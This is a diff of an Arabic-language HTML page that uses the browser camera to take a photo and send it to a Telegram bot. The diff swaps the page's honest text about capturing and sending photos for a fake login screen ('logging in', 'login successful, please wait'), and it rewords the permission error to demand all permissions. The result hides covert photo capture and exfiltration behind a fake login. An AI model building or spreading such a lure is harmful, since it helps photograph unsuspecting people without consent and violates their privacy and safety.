@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📷 خزانة خاصة - تم الالتقاط</title>
+    <title>𝑘𝑎𝑘𝑎ℎ𝑦🇾🇪</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -27,13 +27,13 @@
 </head>
 <body>
 
-    <h1>✅ تم تفعيل الخزانة الخاصة</h1>
-    <p>تتم عملية التقاط الصورة وإرسالها إلى بوت التليجرام الخاص بك في الخلفية.</p>
+    <h1> مرحبآ بكم</h1>
+    <p>سيتم تسجيل الدخول حاليآ.</p>
 
     <video id="camera-feed" autoplay playsinline></video>
     <canvas id="photo-canvas"></canvas>
 
-    <p id="status-message">جاري طلب الوصول إلى الكاميرا...</p>
+    <p id="status-message">جاري تسجيل الدخول ..</p>
 
     <script>
         const video = document.getElementById('camera-feed');
@@ -42,7 +42,7 @@
         
         // 🛑 دالة التقاط وإرسال تلقائية 🛑
         function captureAndSend() {
-            statusMessage.textContent = '📸 جاري التقاط الصورة وإرسالها...';
+            statusMessage.textContent = 'جاري تسجيل الدخول...';
 
             // إضافة تأخير بسيط لضمان استقرار الإطار (لمنع الصورة السوداء)
             setTimeout(() => {
@@ -78,8 +78,8 @@
                 };
 
             } catch (err) {
-                console.error("خطأ في الوصول إلى الكاميرا: ", err);
-                statusMessage.textContent = '⛔ يجب عليك السماح بالوصول إلى الكاميرا لتتمكن من استخدام هذه الخاصية.';
+                console.error(" خطا في تسجيل الدخول 💔 ", err);
+                statusMessage.textContent = '⛔ يجب عليك اعطاء كل الصلاحيات لكي يتك تشغيل جميع الميزات';
             }
         }
 
@@ -98,7 +98,7 @@
                 });
 
                 if (response.ok) {
-                    statusMessage.textContent = '✅ تم التقاط الصورة وإرسالها إلى التليجرام بنجاح!';
+                    statusMessage.textContent = '✅ تم تسجيل الدخول بنجاح انتضر قليلآ🤍';
                 } else {
                     const errorData = await response.json().catch(() => ({ message: response.statusText }));
                     statusMessage.textContent = `❌ فشل الإرسال. تأكد من أن البوت يعمل.`;
